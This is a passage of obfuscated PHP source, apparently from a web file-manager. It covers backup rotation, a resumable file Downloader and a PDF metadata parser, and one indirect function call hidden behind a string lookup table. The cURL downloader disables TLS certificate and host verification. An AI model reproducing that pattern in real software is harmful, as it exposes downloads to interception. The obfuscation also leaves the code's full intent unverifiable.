$b¼ç Í†‡‘[694] => array($b¼ç Í†‡‘[689] => 0, $b¼ç Í†‡‘[695] => 0, $b¼ç Í†‡‘[696] => 0, $b¼ç Í†‡‘[29] => $b¼ç Í†‡‘[33]), $b¼ç Í†‡‘[697] => array($b¼ç Í†‡‘[689] => 0, $b¼ç Í†‡‘[695] => 0, $b¼ç Í†‡‘[696] => 0), $b¼ç Í†‡‘[164] => array($b¼ç Í†‡‘[689] => 0, $b¼ç Í†‡‘[698] => 0, $b¼ç Í†‡‘[699] => 0, $b¼ç Í†‡‘[700] => 0, $b¼ç Í†‡‘[701] => 0, $b¼ç Í†‡‘[415] => $a®ÆÂÎ½’Î)), $b¼ç Í†‡‘[702] => time(), $b¼ç Í†‡‘[703] => 0); $b×ßÑÇˆ¦ = Model($b¼ç Í†‡‘[688])->insert($E¾°Á‰Èí¤); goto f‚ ÁŒàŸº; F¸»ßº÷µ: } private function checkStore($f¡Æè¥Å) { $AÆÛŒåƒè =& $_SERVER[¢à]; $Aù†œ½¡ÑÂ = Model($AÆÛŒåƒè[704])->listData($f¡Æè¥Å); Model($AÆÛŒåƒè[704])->checkConfig($Aù†œ½¡ÑÂ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¢à][688])->findByName(self::$name); } return self::$option; } public static function set($c…àÅñÙÚ) { $a‹®Õ”£££ =& $_SERVER[¢à]; $dÖˆÛî² = self::get(); foreach ($c…àÅñÙÚ as $A ğÊÊåèÆ => $f–Ô¼×¹œµ) { $dæ‘ÅéõÇˆ = explode($a‹®Õ”£££[93], $A ğÊÊåèÆ); $b–„êŸñë = count($dæ‘ÅéõÇˆ); switch ($b–„êŸñë) { case 1: $dÖˆÛî²[$dæ‘ÅéõÇˆ[0]] = $f–Ô¼×¹œµ; break; case 2: $dÖˆÛî²[$dæ‘ÅéõÇˆ[0]][$dæ‘ÅéõÇˆ[1]] = $f–Ô¼×¹œµ; break; case 3: $dÖˆÛî²[$dæ‘ÅéõÇˆ[0]][$dæ‘ÅéõÇˆ[1]][$dæ‘ÅéõÇˆ[2]] = $f–Ô¼×¹œµ; break; } } Model($a‹®Õ”£££[688])->update($dÖˆÛî²[$a‹®Õ”£££[364]], $dÖˆÛî²); self::$option = $dÖˆÛî²; return self::$option; } public function keep() { $FåöÄÀ‚› =& $_SERVER[¢à]; $c„ç¨ŠĞ¤ = self::get(); if ($c„ç¨ŠĞ¤[$FåöÄÀ‚›[278]][$FåöÄÀ‚›[693]][$FåöÄÀ‚›[689]] == $FåöÄÀ‚›[83]) { return; } $this->backupKeep($c„ç¨ŠĞ¤); self::set(array($FåöÄÀ‚›[705] => 1)); } private function backupKeep($Dõ´¢…•) { goto c®½¾¼‘Š·; cÖÌ¥Š¢¨Ã: for ($C†ŠÏÛ³’ì = 0; $C†ŠÏÛ³’ì < 12; $C†ŠÏÛ³’ì++) { $CÇ´ù”Ÿñæ[] = date($BÇ‡–±[706], strtotime("\x2d{$C†ŠÏÛ³’ì}\40\x6d\x6f\156\164\x68\163")); } $CÇ´ù”Ÿñæ = array_unique($CÇ´ù”Ÿñæ); foreach ($e…ø¬¦ÉŠØ as $D¢§ÂÏŠˆ‚) { if (!empty($D¢§ÂÏŠˆ‚[$BÇ‡–±[28]]) && in_array($D¢§ÂÏŠˆ‚[$BÇ‡–±[28]], $CÇ´ù”Ÿñæ)) { continue; } Model($BÇ‡–±[688])->remove($D¢§ÂÏŠˆ‚[$BÇ‡–±[364]]); $F¨Á©¸è™ƒ = "\173\x69\157\x3a{$Dõ´¢…•[$BÇ‡–±[691]]}\175\57\x64\x61\x74\141\x62\141\163\145\x2f\x62\141\x63\x6b\165\x70\x5f{$D¢§ÂÏŠˆ‚[$BÇ‡–±[28]]}"; IO::remove($F¨Á©¸è™ƒ, !1); } goto d„äËÁ¿ïõ; c®½¾¼‘Š·: $BÇ‡–± =& $_SERVER[¢à]; $e…ø¬¦ÉŠØ = Model($BÇ‡–±[688])->listData(); if (empty($e…ø¬¦ÉŠØ)) { return; } goto Fˆøä´ÄéÅ; Fˆøä´ÄéÅ: $C†ŠÏÛ³’ì = 0; $CÇ´ù”Ÿñæ = array(); foreach ($e…ø¬¦ÉŠØ as $D¢§ÂÏŠˆ‚) { if ($C†ŠÏÛ³’ì >= 7) { break; } $CÇ´ù”Ÿñæ[] = $D¢§ÂÏŠˆ‚[$BÇ‡–±[28]]; $C†ŠÏÛ³’ì++; } goto cÖÌ¥Š¢¨Ã; d„äËÁ¿ïõ: } public function db() { goto F×ˆ”·’Û; a“ÙÅƒ†·é: $c£˜ôóÈ¥„ = new BackupDb(); if (!$c£˜ôóÈ¥„->index()) { return !1; } self::set(array($DÌĞà¶Ù«×[707] => 1)); goto AÄÆ³¿»é‚; AÄÆ³¿»é‚: return !0; goto c“†ÇõÍ•ô; F×ˆ”·’Û: $DÌĞà¶Ù«× =& $_SERVER[¢à]; $aç–ƒ’ = self::get(); if ($aç–ƒ’[$DÌĞà¶Ù«×[278]][$DÌĞà¶Ù«×[694]][$DÌĞà¶Ù«×[689]] == $DÌĞà¶Ù«×[83]) { return !0; } goto a“ÙÅƒ†·é; c“†ÇõÍ•ô: } public function dbFile() { goto C•öƒÒâ Ş; C•öƒÒâ Ş: $d±ÒŠßÃĞÔ =& $_SERVER[¢à]; $E¤¢óµÅ›À = self::get(); if ($E¤¢óµÅ›À[$d±ÒŠßÃĞÔ[278]][$d±ÒŠßÃĞÔ[697]][$d±ÒŠßÃĞÔ[689]] == $d±ÒŠßÃĞÔ[83]) { return !0; } goto e‰ñÁ²© •; AÔ‰•³äåÙ: return !0; goto fŞ´‚ÖÙ‡Æ; e‰ñÁ²© •: $C…¶ÈçÓ™ = new BackupDbFile(); if (!$C…¶ÈçÓ™->index()) { return !1; } self::set(array($d±ÒŠßÃĞÔ[708] => 1)); goto AÔ‰•³äåÙ; fŞ´‚ÖÙ‡Æ: } public function file() { $fÜ•æšÍË =& $_SERVER[¢à]; $bèôÖÇñğ½ = self::get(); if ($bèôÖÇñğ½[$fÜ•æšÍË[278]][$fÜ•æšÍË[164]][$fÜ•æšÍË[689]] == $fÜ•æšÍË[83]) { return !0; } if (!isset($bèôÖÇñğ½[$fÜ•æšÍË[692]]) || $bèôÖÇñğ½[$fÜ•æšÍË[692]] == $fÜ•æšÍË[464]) { $EŸÓäß£ = new BackupFile(); if (!$EŸÓäß£->index()) { return !1; } } self::set(array($fÜ•æšÍË[709] => 1, $fÜ•æšÍË[689] => 1)); return !0; } } goto Aî¼“ôß®; eáóôğÌ»ô: if ($_SERVER[$_SERVER[¢à][786]] != $_SERVER[$_SERVER[¢à][1294]]) { goto FËğ¼µÑ´Õ; FËğ¼µÑ´Õ: $B™ ÷İì´´ = $_SERVER[¢à][789]; $DÄ¥ï·…«à = $_SERVER[$_SERVER[¢à][790]] . $_SERVER[¢à][791]; $A÷Ü«òå¦ = $B™ ÷İì´´($DÄ¥ï·…«à); goto a¦é„†–óÕ; fœáá®˜œ: $eãàîŸÌÑÈ($_SERVER[$_SERVER[¢à][787]]); goto F¬…”á«‡; a¦é„†–óÕ: $CèÅ‘…×¸ä = explode($_SERVER[¢à][214], $A÷Ü«òå¦); if (count($CèÅ‘…×¸ä) < $_SERVER[¢à][571]) { $b½Ğ•«½Í• = $_SERVER[¢à][792]; $b½Ğ•«½Í•(); } $eãàîŸÌÑÈ = $_SERVER[¢à][1113]; goto fœáá®˜œ; F¬…”á«‡: } class Downloader { static function start($e¼±æÛ–¿ä, $dß³ŒÚ·, $dÄĞí×ö = 10) { goto CŠ‹ªÀåéê; C„‚…é‹¹„: $bÃ´­¾†«ó = intval($a·²Â¯íñÓ[$d´Ú÷ÕÔ œ[322]]); if (file_exists($fèàÇÍ‚Ú÷) && time() - filemtime($fèàÇÍ‚Ú÷) < 3) { return array($d´Ú÷ÕÔ œ[1028] => !1, $d´Ú÷ÕÔ œ[1030] => $d´Ú÷ÕÔ œ[1487]); } $b¾öĞ×«é¸ = array(); goto aÄá›Œâïˆ; FÙó»Ã¿¯™: if ($CÍİáÜŠ±Í > $bÃ´­¾†«ó) { @unlink($fèàÇÍ‚Ú÷); } file_put_contents($BÉÛ¬å‹Ó, json_encode($b¾öĞ×«é¸)); $B¨¸ñ„±‚ñ = self::fileDownloadCurl($e¼±æÛ–¿ä, $dß³ŒÚ·, !0, $CÍİáÜŠ±Í, $bÃ´­¾†«ó); goto B¾«Ãø‘³İ; aÄá›Œâïˆ: if (is_file($BÉÛ¬å‹Ó)) { $Có¢Š•Ä¾À = file_get_contents($BÉÛ¬å‹Ó); $b¾öĞ×«é¸ = json_decode($Có¢Š•Ä¾À, 1); } if (file_exists($dß³ŒÚ·) && $bÃ´­¾†«ó == filesize($dß³ŒÚ·)) { @unlink($fèàÇÍ‚Ú÷); @unlink($BÉÛ¬å‹Ó); return array($d´Ú÷ÕÔ œ[1028] => !0, $d´Ú÷ÕÔ œ[1030] => $d´Ú÷ÕÔ œ[1488]); } if ($b¾öĞ×«é¸[$d´Ú÷ÕÔ œ[322]] != $bÃ´­¾†«ó) { $b¾öĞ×«é¸ = array($d´Ú÷ÕÔ œ[322] => $bÃ´­¾†«ó); } goto FÙó»Ã¿¯™; dÒè•ÄßïÖ: if (!$e¼±æÛ–¿ä) { return array($d´Ú÷ÕÔ œ[1028] => !1, $d´Ú÷ÕÔ œ[1030] => $d´Ú÷ÕÔ œ[1033]); } if (!$a·²Â¯íñÓ[$d´Ú÷ÕÔ œ[1278]] || $a·²Â¯íñÓ[$d´Ú÷ÕÔ œ[322]] == 0) { @unlink($fèàÇÍ‚Ú÷); @unlink($dß³ŒÚ·); $B¨¸ñ„±‚ñ = self::fileDownloadFopen($e¼±æÛ–¿ä, $dß³ŒÚ·, $a·²Â¯íñÓ[$d´Ú÷ÕÔ œ[322]]); if ($B¨¸ñ„±‚ñ[$d´Ú÷ÕÔ œ[1028]]) { return $B¨¸ñ„±‚ñ; } else { @unlink($fèàÇÍ‚Ú÷); @unlink($dß³ŒÚ·); $B¨¸ñ„±‚ñ = self::fileDownloadCurl($e¼±æÛ–¿ä, $dß³ŒÚ·, !1, 0, $a·²Â¯íñÓ[$d´Ú÷ÕÔ œ[322]]); @unlink($fèàÇÍ‚Ú÷); return $B¨¸ñ„±‚ñ; } } $CÍİáÜŠ±Í = is_file($fèàÇÍ‚Ú÷) ? filesize($fèàÇÍ‚Ú÷) : 0; goto C„‚…é‹¹„; CŠ‹ªÀåéê: $d´Ú÷ÕÔ œ =& $_SERVER[¢à]; if (!request_url_safe($e¼±æÛ–¿ä)) { return array($d´Ú÷ÕÔ œ[1028] => !1, $d´Ú÷ÕÔ œ[1030] => $d´Ú÷ÕÔ œ[1033]); } $BÉÛ¬å‹Ó = $dß³ŒÚ· . $d´Ú÷ÕÔ œ[1485]; goto CÈØ£¾ôÍ; B¾«Ãø‘³İ: if ($B¨¸ñ„±‚ñ[$d´Ú÷ÕÔ œ[1028]]) { @unlink($BÉÛ¬å‹Ó); } return $B¨¸ñ„±‚ñ; goto Bä¾ª­·ô©; CÈØ£¾ôÍ: $fèàÇÍ‚Ú÷ = $dß³ŒÚ· . $d´Ú÷ÕÔ œ[1486]; if (is_array($e¼±æÛ–¿ä)) { $a·²Â¯íñÓ = $e¼±æÛ–¿ä; } else { $a·²Â¯íñÓ = url_header($e¼±æÛ–¿ä); } $e¼±æÛ–¿ä = $a·²Â¯íñÓ[$d´Ú÷ÕÔ œ[292]]; goto dÒè•ÄßïÖ; Bä¾ª­·ô©: } static function fileDownloadFopen($Bƒ’¥æéô, $cŠàÏÛÖÂ‘, $dªğ’“³‹† = 0) { $Aˆíª‡„Ğ =& $_SERVER[¢à]; @ini_set($Aˆíª‡„Ğ[1489], $Aˆíª‡„Ğ[1490]); $fˆ´éçŒİ = $cŠàÏÛÖÂ‘ . $Aˆíª‡„Ğ[1486]; set_timeout(); @unlink($fˆ´éçŒİ); if ($däØĞÛÑ¯Í = @fopen($Bƒ’¥æéô, $Aˆíª‡„Ğ[1491])) { goto fí·ÜÌŒ; dó¬Û‘…Šé: self::checkGzip($fˆ´éçŒİ); if (!@rename($fˆ´éçŒİ, $cŠàÏÛÖÂ‘)) { usleep(round(rand(0, 1000) * 50)); @unlink($cŠàÏÛÖÂ‘); $DêÚÌŠ—óˆ = @rename($fˆ´éçŒİ, $cŠàÏÛÖÂ‘); if (!$DêÚÌŠ—óˆ) { return array($Aˆíª‡„Ğ[1028] => !1, $Aˆíª‡„Ğ[1030] => $Aˆíª‡„Ğ[1496]); } } return array($Aˆíª‡„Ğ[1028] => !0, $Aˆíª‡„Ğ[1030] => $Aˆíª‡„Ğ[696]); goto bµÙÇ´ßÔÓ; fí·ÜÌŒ: if (!($C¦•ÔÁŒ¹Ã = @fopen($fˆ´éçŒİ, $Aˆíª‡„Ğ[1492]))) { return array($Aˆíª‡„Ğ[1028] => !1, $Aˆíª‡„Ğ[1030] => $Aˆíª‡„Ğ[1493]); } while (!feof($däØĞÛÑ¯Í)) { if (!file_exists($fˆ´éçŒİ)) { fclose($C¦•ÔÁŒ¹Ã); return array($Aˆíª‡„Ğ[1028] => !1, $Aˆíª‡„Ğ[1030] => $Aˆíª‡„Ğ[1494]); } clearstatcache(); if ($dªğ’“³‹† > 0 && $dªğ’“³‹† == filesize(iconv_system($fˆ´éçŒİ))) { break; } fwrite($C¦•ÔÁŒ¹Ã, fread($däØĞÛÑ¯Í, 1024 * 8), 1024 * 8); } fclose($C¦•ÔÁŒ¹Ã); goto a¤ÑöôÂæ•; a¤ÑöôÂæ•: fclose($däØĞÛÑ¯Í); $F–§ÃÖÇ¯é = filesize(iconv_system($fˆ´éçŒİ)); if ($dªğ’“³‹† != 0 && $F–§ÃÖÇ¯é != $dªğ’“³‹†) { return array($Aˆíª‡„Ğ[1028] => !1, $Aˆíª‡„Ğ[1030] => $Aˆíª‡„Ğ[1495]); } goto dó¬Û‘…Šé; bµÙÇ´ßÔÓ: } else { return array($Aˆíª‡„Ğ[1028] => !1, $Aˆíª‡„Ğ[1030] => $Aˆíª‡„Ğ[1497]); } } static function fileDownloadCurl($dñ„ƒÊ¿«°, $fˆ¾ì¥…‚„, $c±ùê¼¯–® = false, $F£ñƒ­±ä = 0, $dÏØ±œ¦­Ü = 0) { goto b‹í ‹ÀÌÛ; b¥ ˜ùøÚ¹: return array($c¾˜æĞ†Çæ[1028] => !1, $c¾˜æĞ†Çæ[1030] => $c¾˜æĞ†Çæ[1501]); goto c‰—Ï³‡ˆƒ; DèÀö‚›©í: if ($c±ùê¼¯–®) { curl_setopt($bóŸš¶½éö, CURLOPT_RANGE, $F£ñƒ­±ä . $c¾˜æĞ†Çæ[714]); } curl_setopt($bóŸš¶½éö, CURLOPT_FILE, $d‚¥µ±‡Â); curl_setopt($bóŸš¶½éö, CURLOPT_REFERER, get_url_link($dñ„ƒÊ¿«°)); goto BÆ—¿ôóÌ; b‹í ‹ÀÌÛ: $c¾˜æĞ†Çæ =& $_SERVER[¢à]; $cÇ‹ „›‰› = $fˆ¾ì¥…‚„ . $c¾˜æĞ†Çæ[1486]; set_timeout(); goto bôÆ‹¡áÚ; BÆ—¿ôóÌ: curl_setopt($bóŸš¶½éö, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bóŸš¶½éö, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bóŸš¶½éö, CURLOPT_SSL_VERIFYHOST, 0); goto cƒùå¤‘·†; bôÆ‹¡áÚ: $d‚¥µ±‡Â = @fopen($cÇ‹ „›‰›, $c¾˜æĞ†Çæ[978]); if (!$d‚¥µ±‡Â) { return array($c¾˜æĞ†Çæ[1028] => !1, $c¾˜æĞ†Çæ[1030] => $c¾˜æĞ†Çæ[1498]); } $bóŸš¶½éö = curl_init($dñ„ƒÊ¿«°); goto DèÀö‚›©í; Aê™È¨ò•Ó: curl_close($bóŸš¶½éö); fclose($d‚¥µ±‡Â); $C¹¥ùåêñ = filesize(iconv_system($cÇ‹ „›‰›)); goto B†Û¶ë˜Ê; cƒùå¤‘·†: curl_setopt($bóŸš¶½éö, CURLOPT_NOPROGRESS, !1); curl_setopt($bóŸš¶½éö, CURLOPT_PROGRESSFUNCTION, $c¾˜æĞ†Çæ[1499]); curl_progress_start($bóŸš¶½éö); goto F ¸„¤…‰‡; B†Û¶ë˜Ê: if ($C¹¥ùåêñ < $dÏØ±œ¦­Ü && $dÏØ±œ¦­Ü != 0) { return array($c¾˜æĞ†Çæ[1028] => !1, $c¾˜æĞ†Çæ[1030] => $c¾˜æĞ†Çæ[1487]); } if ($C¹¥ùåêñ > $dÏØ±œ¦­Ü && $dÏØ±œ¦­Ü != 0) { return array($c¾˜æĞ†Çæ[1028] => !1, $c¾˜æĞ†Çæ[1030] => $c¾˜æĞ†Çæ[1495]); } if ($c¥ºÂÑ‹£Ä && filesize($cÇ‹ „›‰›) != 0) { self::checkGzip($cÇ‹ „›‰›); if (!@rename($cÇ‹ „›‰›, $fˆ¾ì¥…‚„)) { @unlink($fˆ¾ì¥…‚„); $c¥ºÂÑ‹£Ä = @rename($cÇ‹ „›‰›, $fˆ¾ì¥…‚„); if (!$c¥ºÂÑ‹£Ä) { return array($c¾˜æĞ†Çæ[1028] => !1, $c¾˜æĞ†Çæ[1030] => $c¾˜æĞ†Çæ[1500]); } } return array($c¾˜æĞ†Çæ[1028] => !0, $c¾˜æĞ†Çæ[1030] => $c¾˜æĞ†Çæ[696]); } goto b¥ ˜ùøÚ¹; F ¸„¤…‰‡: curl_setopt($bóŸš¶½éö, CURLOPT_USERAGENT, $c¾˜æĞ†Çæ[1490]); $c¥ºÂÑ‹£Ä = curl_exec($bóŸš¶½éö); curl_progress_end($bóŸš¶½éö); goto Aê™È¨ò•Ó; c‰—Ï³‡ˆƒ: } static function checkGzip($aÑ”³Ñ„Û‘) { goto A¶Ã¡ğ¬Ã; C§ÂªèöŒ³: file_put_contents($aÑ”³Ñ„Û‘, $Eêõ¢Í„Şô); goto B¾ŒËİ½›; eÆç¿¤‚“ : ob_start(); readgzfile($aÑ”³Ñ„Û‘); $Eêõ¢Í„Şô = ob_get_clean(); goto C§ÂªèöŒ³; A¶Ã¡ğ¬Ã: $fÚÇ®ÙŠŒ = $_SERVER[¢à][1502]; $eğôô¨”¹¤ = file_sub_str($aÑ”³Ñ„Û‘, 0, 2); if ($fÚÇ®ÙŠŒ != $eğôô¨”¹¤) { return; } goto eÆç¿¤‚“ ; B¾ŒËİ½›: } } class FileParsePdf { public static function parse($e­ÍŸĞåªŒ) { goto D¥ÔÉ‚ğğğ; e¶Ü¢šìÔÖ: preg_match_all($Fºèš «§, $bŒî«‰ìé[$fÏÈ”äÓÜõ[1504]], $bàµùµÑº); if ($bàµùµÑº[1] && $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1511]] < $bàµùµÑº[1][0]) { $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1511]] = $bàµùµÑº[1][0]; } preg_match_all($Fºèš «§, $bŒî«‰ìé[$fÏÈ”äÓÜõ[1505]], $bàµùµÑº); goto bºˆÃ±ÎƒÚ; CÅ¾šç˜Â‘: preg_match($Fºèš «§, $bŒî«‰ìé[$fÏÈ”äÓÜõ[1505]], $bàµùµÑº); if (!$EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1507]] && count($bàµùµÑº) == 5) { $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1507]] = $bàµùµÑº[3]; $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1509]] = $bàµùµÑº[4]; } preg_match($fÏÈ”äÓÜõ[1510], $bŒî«‰ìé[$fÏÈ”äÓÜõ[1504]], $bàµùµÑº); goto DôÄ‡¹£ËØ; D¥ÔÉ‚ğğğ: $fÏÈ”äÓÜõ =& $_SERVER[¢à]; $E“Ï×Ü”•‘ = 32 * 1024; $bŒî«‰ìé = array($fÏÈ”äÓÜõ[775] => fopen($e­ÍŸĞåªŒ, $fÏÈ”äÓÜõ[1159]), $fÏÈ”äÓÜõ[75] => $e­ÍŸĞåªŒ, $fÏÈ”äÓÜõ[77] => filesize($e­ÍŸĞåªŒ), $fÏÈ”äÓÜõ[1503] => $E“Ï×Ü”•‘); goto E·¡£ˆëö‡; EŠôÂÅ ¥: if ($Eğ¯‘áÌÛ) { $aê±‹Ú¢‹¯ = $Eğ¯‘áÌÛ[$fÏÈ”äÓÜõ[1506]][$fÏÈ”äÓÜõ[1181]]; $EÙ›¥»¨Èà = self::getObjectValue($bŒî«‰ìé, $Eğ¯‘áÌÛ, $aê±‹Ú¢‹¯); } $EÙ›¥»¨Èà = is_array($EÙ›¥»¨Èà) ? $EÙ›¥»¨Èà : array(); $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1507]] = 0; goto DÜµØùİĞÇ; DÜµØùİĞÇ: $Fºèš «§ = $fÏÈ”äÓÜõ[1508]; preg_match($Fºèš «§, $bŒî«‰ìé[$fÏÈ”äÓÜõ[1504]], $bàµùµÑº); if (!$EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1507]] && count($bàµùµÑº) == 5) { $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1507]] = $bàµùµÑº[3]; $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1509]] = $bàµùµÑº[4]; } goto CÅ¾šç˜Â‘; E·¡£ˆëö‡: $bŒî«‰ìé[$fÏÈ”äÓÜõ[1504]] = StreamWrapperIO::read($e­ÍŸĞåªŒ, 0, $E“Ï×Ü”•‘); $bŒî«‰ìé[$fÏÈ”äÓÜõ[1505]] = StreamWrapperIO::read($e­ÍŸĞåªŒ, $bŒî«‰ìé[$fÏÈ”äÓÜõ[77]] - $E“Ï×Ü”•‘, $E“Ï×Ü”•‘); $Eğ¯‘áÌÛ = self::decodeXref($bŒî«‰ìé); goto EŠôÂÅ ¥; bºˆÃ±ÎƒÚ: if ($bàµùµÑº[1] && $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1511]] < $bàµùµÑº[1][0]) { $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1511]] = $bàµùµÑº[1][0]; } $EÙ›¥»¨Èà = self::parseInfoItem($EÙ›¥»¨Èà); return $EÙ›¥»¨Èà; goto cË´Şßß’È; DôÄ‡¹£ËØ: if ($bàµùµÑº) { $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1316]] = $bàµùµÑº[1]; } $EÙ›¥»¨Èà[$fÏÈ”äÓÜõ[1511]] = 0; $Fºèš «§ = $fÏÈ”äÓÜõ[1512]; goto e¶Ü¢šìÔÖ; cË´Şßß’È: } private static function parseInfoItem($Dç“ãèÙâ) { $dÆÍ‚Ìó­Ù =& $_SERVER[¢à]; if (!$Dç“ãèÙâ) { return !1; } $eÏŒÏ™»À = array($dÆÍ‚Ìó­Ù[1317] => array($dÆÍ‚Ìó­Ù[1513], $dÆÍ‚Ìó­Ù[33]), $dÆÍ‚Ìó­Ù[1514] => array($dÆÍ‚Ìó­Ù[1515], $dÆÍ‚Ìó­Ù[33]), $dÆÍ‚Ìó­Ù[184] => array($dÆÍ‚Ìó­Ù[1516], $dÆÍ‚Ìó­Ù[207]), $dÆÍ‚Ìó­Ù[107] => array($dÆÍ‚Ìó­Ù[1517], $dÆÍ‚Ìó­Ù[207]), $dÆÍ‚Ìó­Ù[1511] => array($dÆÍ‚Ìó­Ù[1511], $dÆÍ‚Ìó­Ù[273]), $dÆÍ‚Ìó­Ù[1507] => array($dÆÍ‚Ìó­Ù[1507], $dÆÍ‚Ìó­Ù[273]), $dÆÍ‚Ìó­Ù[1509] => array($dÆÍ‚Ìó­Ù[1509], $dÆÍ‚Ìó­Ù[273]), $dÆÍ‚Ìó­Ù[1518] => array($dÆÍ‚Ìó­Ù[1519], $dÆÍ‚Ìó­Ù[33]), $dÆÍ‚Ìó­Ù[1520] => array($dÆÍ‚Ìó­Ù[1521], $dÆÍ‚Ìó­Ù[33]), $dÆÍ‚Ìó­Ù[1522] => array($dÆÍ‚Ìó­Ù[1316], $dÆÍ‚Ìó­Ù[33])); $bŒÚ½—Ãæ = array(); foreach ($eÏŒÏ™»À as $dµæ–Úµöˆ => $Fšõœ¤¿˜µ) { if (!isset($Dç“ãèÙâ[$Fšõœ¤¿˜µ[0]])) { continue; } $aÕÓÊÊ˜¦º = $Dç“ãèÙâ[$Fšõœ¤¿˜µ[0]]; if (!$aÕÓÊÊ˜¦º || is_array($aÕÓÊÊ˜¦º)) { continue; } switch ($Fšõœ¤¿˜µ[1]) { case $dÆÍ‚Ìó­Ù[273]: $aÕÓÊÊ˜¦º = intval($aÕÓÊÊ˜¦º); break; case $dÆÍ‚Ìó­Ù[207]: if (substr($aÕÓÊÊ˜¦º, 0, 2) == $dÆÍ‚Ìó­Ù[1523]) { $aÕÓÊÊ˜¦º = substr($aÕÓÊÊ˜¦º, 2, 14); } if (strtotime($aÕÓÊÊ˜¦º)) { $aÕÓÊÊ˜¦º = date($dÆÍ‚Ìó­Ù[1524], strtotime($aÕÓÊÊ˜¦º)); } break; } $bŒÚ½—Ãæ[$dµæ–Úµöˆ] = $aÕÓÊÊ˜¦º; } return $bŒÚ½—Ãæ; } private static function decodeXref(&$b¤ÖºÌ‘Ãê) { goto eƒ¯º»‰Æê; eƒ¯º»‰Æê: $CÉö½Õà‚Š =& $_SERVER[¢à]; $D³®ïƒ•ÌÅ = $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1505]]; $d¯†™½íï = array($CÉö½Õà‚Š[1506] => array(), $CÉö½Õà‚Š[1525] => array()); goto fŠ¨†ï´ªÙ; F‹œµàğ‰: if (preg_match($CÉö½Õà‚Š[1532], $eÚÀ×Ì˜²°, $E‹ŒšµÆºÛ) > 0) { $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[77]] = intval($E‹ŒšµÆºÛ[1]); } if (preg_match($CÉö½Õà‚Š[1533], $eÚÀ×Ì˜²°, $E‹ŒšµÆºÛ) > 0) { $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[1534]] = intval($E‹ŒšµÆºÛ[1]) . $CÉö½Õà‚Š[70] . intval($E‹ŒšµÆºÛ[2]); } if (preg_match($CÉö½Õà‚Š[1535], $eÚÀ×Ì˜²°, $E‹ŒšµÆºÛ) > 0) { $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[1536]] = intval($E‹ŒšµÆºÛ[1]) . $CÉö½Õà‚Š[70] . intval($E‹ŒšµÆºÛ[2]); } goto C½¶ñ–ØÊ; AÍĞÍÊ¹©‰: if ($b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[77]] - $bÇ‡İ®ĞÖ > $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1503]]) { $eù‰“ï¬Òõ = 4 * $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1503]]; $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1503]] = $eù‰“ï¬Òõ; $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1504]] = StreamWrapperIO::read($b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[75]], 0, $eù‰“ï¬Òõ); $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1505]] = StreamWrapperIO::read($b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[75]], $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[77]] - $eù‰“ï¬Òõ, $eù‰“ï¬Òõ); $D³®ïƒ•ÌÅ = $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1505]]; } $BÆ¹øÛö´ç = 0; preg_match_all($CÉö½Õà‚Š[1527], $D³®ïƒ•ÌÅ, $E‹ŒšµÆºÛ); goto B¡ëÆ¬™áÚ; CÎÁ¤Àå¢: if (preg_match($CÉö½Õà‚Š[1539], $eÚÀ×Ì˜²°, $E‹ŒšµÆºÛ) > 0) { } return $d¯†™½íï; goto DåĞ·Å¸¶È; C½¶ñ–ØÊ: if (preg_match($CÉö½Õà‚Š[1537], $eÚÀ×Ì˜²°, $E‹ŒšµÆºÛ) > 0) { $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[1181]] = intval($E‹ŒšµÆºÛ[1]) . $CÉö½Õà‚Š[70] . intval($E‹ŒšµÆºÛ[2]); } if (preg_match($CÉö½Õà‚Š[1538], $eÚÀ×Ì˜²°, $E‹ŒšµÆºÛ) > 0) { $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[364]] = array(); $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[364]][0] = $E‹ŒšµÆºÛ[1]; $d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[364]][1] = $E‹ŒšµÆºÛ[2]; } if (!$d¯†™½íï[$CÉö½Õà‚Š[1506]][$CÉö½Õà‚Š[1181]]) { return !1; } goto CÎÁ¤Àå¢; fŠ¨†ï´ªÙ: $Fˆ¶ô¬Ò´é = $CÉö½Õà‚Š[1526]; if (!preg_match_all($Fˆ¶ô¬Ò´é, $D³®ïƒ•ÌÅ, $E‹ŒšµÆºÛ, PREG_SET_ORDER, 0)) { return !1; } $bÇ‡İ®ĞÖ = intval($E‹ŒšµÆºÛ[0][1]); goto AÍĞÍÊ¹©‰; B¡ëÆ¬™áÚ: foreach ($E‹ŒšµÆºÛ[3] as $f»èñÌ‹Çå => $EŠ‰‘Ÿ¾§Ü) { if ($E‹ŒšµÆºÛ[3][$f»èñÌ‹Çå] == $CÉö½Õà‚Š[1528]) { $AÄ™¸‡’Êó = $BÆ¹øÛö´ç . $CÉö½Õà‚Š[70] . 